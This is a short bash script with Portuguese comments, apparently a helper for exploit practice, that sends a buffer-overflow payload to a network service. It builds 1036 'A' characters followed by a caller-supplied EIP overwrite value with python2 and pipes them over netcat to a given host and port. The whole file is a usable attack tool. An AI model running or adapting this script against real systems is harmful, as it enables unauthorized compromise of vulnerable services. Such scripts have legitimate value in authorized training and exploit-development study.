#!/bin/bash

#Autor: Izael Magalhaes
#Compilado 04.04.2022
#izaelbm.com.br
#Script Part2
#Utilizado para dar bypass BoF

host=$1
port=$2
file=$3
buff_size=$4
eip=$5
func=$6
echo " "
echo "========="
echo "Funcao: "$func" EIP "$eip

echo $1 $2 $3 $4 $5 $6

recv=$(python2 -c "print('A' * 1036 + '"$eip"')" | nc -v $host $port)
echo $recv
sleep 1
echo " "
